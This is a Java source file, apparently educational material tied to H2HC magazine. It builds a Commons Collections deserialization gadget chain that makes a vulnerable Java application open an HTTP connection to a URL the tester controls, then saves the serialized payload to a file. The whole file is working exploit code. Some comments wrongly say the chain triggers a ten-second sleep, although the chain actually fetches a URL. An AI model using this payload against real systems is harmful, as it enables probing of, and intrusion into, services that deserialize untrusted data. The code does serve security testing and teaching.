import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

/**
 * Gera payload com gadget chain para realizar um HTTP GET em um endereço
 * controlado pelo testador. Se for usado um domínio "hospedado" pelo testador,
 * pode-se validar se o payload foi executado ao verificar os logs do servico DNS.
 * Note que esse payload requer que a commons-collections vulnerável esteja
 * disponível no classpath (<= 3.2.1), bem como a AnnotationInvocationHandler do JRE < 8u72
 * Há outro payload, desenvolvido por Gabriel Lawrence, que permite forçar uma
 * consulta DNS usufruindo apenas das classes URL e HashMap (que são serializáves).
 *
 * -----------------------------------------------------------------------
 * Mais detalhes na 12a edição da H2HC (hackers to hackers) magazine:
 * https://www.h2hc.com.br/revista/
 * -----------------------------------------------------------------------
 *
 * OBS: Esse código tem fins apenas didáticos. Algumas cadeias de
 * transformers são baseadas nas versões de Chris Frohoff e/ou Matthias Kaiser
 *
 **** USAGE ****
 *
 * Compilando:
 * $ javac -cp .:commons-collections-3.2.1.jar DnsWithCommonsCollections.java
 *
 * Executando
 * $ java -cp .:commons-collections-3.2.1.jar DnsWithCommonsCollections http://www.your_domain.com
 *
 * @author @joaomatosf
 */
public class DnsWithCommonsCollections {
    @SuppressWarnings ( {"unchecked"} )
    public static void main(String[] args)
            throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException {

        String url = args[0];
        // Cria array de transformers que resulta na seguinte construção:
        // new URL(url).openConnection().getInputStream().read();
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(new URL(url)),
                new InvokerTransformer("openConnection", new Class[] { }, new Object[] {}),
                new InvokerTransformer("getInputStream", new Class[] { }, new Object[] {}),
                new InvokerTransformer("read", new Class[] {}, new Object[] {})
        };

        // Cria o objeto ChainedTransformer com o array de Transformers:
        Transformer transformerChain = new ChainedTransformer(transformers);
        // Cria o map
        Map map = new HashMap();
        // Decora o map com o LazyMap e a cadeia de transformações como factory
        Map lazyMap = LazyMap.decorate(map,transformerChain);

        // Usa reflexão para obter referencia da classe AnnotationInvocationHandler
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // Obtem construtor da AnnotationInvocationHandler que recebe um tipo (class) e um Map
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        // Torna o construtor acessível
        ctor.setAccessible(true);
        // Obtem/Cria instancia do AnnotationInvocationHandler, fornecendo (via construtor) um Retetion.class (que eh um
        // type Annotation, requerido pelo construtor) e atribui o LazyMap (contendo a cadeia de Transformers) ao campo
        // memberValues. Assim, ao tentar obter uma chave inexiste deste campo, a cadeia será "executada"!
        InvocationHandler handlerLazyMap = (InvocationHandler) ctor.newInstance(Retention.class, lazyMap);

        //criado a interface map
        Class[] interfaces = new Class[] {java.util.Map.class};
        // cria o Proxy "entre" a interface Map e o AnnotationInvocationHandler anterior (que contém o lazymap+transformers)
        Map proxyMap = (Map) Proxy.newProxyInstance(null, interfaces, handlerLazyMap);

        // cria outro AnnotationInvocationHandler atribui o Proxy ao campo memberValues
        // esse Proxy será "acionado" no magic method readObject e, assim, desviará o fluxo para o
        // método invoke() do primeiro AnnotationInvocationHandler criado (que contém o LazyMap+Transformers)
        InvocationHandler handlerProxy = (InvocationHandler) ctor.newInstance(Retention.class, proxyMap);

        // Serializa o objeto "handlerProxy" e o salva em arquivo. Ao ser desserializado,
        // o readObject irá executar um map.entrySet() e, assim, desviar o fluxo para o invoke().
        // No invoke(), uma chave inexistente será buscada no campo "memberValues" (que contém um LazyMap
        // com a cadeia de Transformers), o que deverá acionar o Thread.sleep(10000)!
        System.out.println("Saving serialized object in SleepExample.ser");
        FileOutputStream fos = new FileOutputStream("SleepExample.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(handlerProxy);
        oos.flush();

    }

}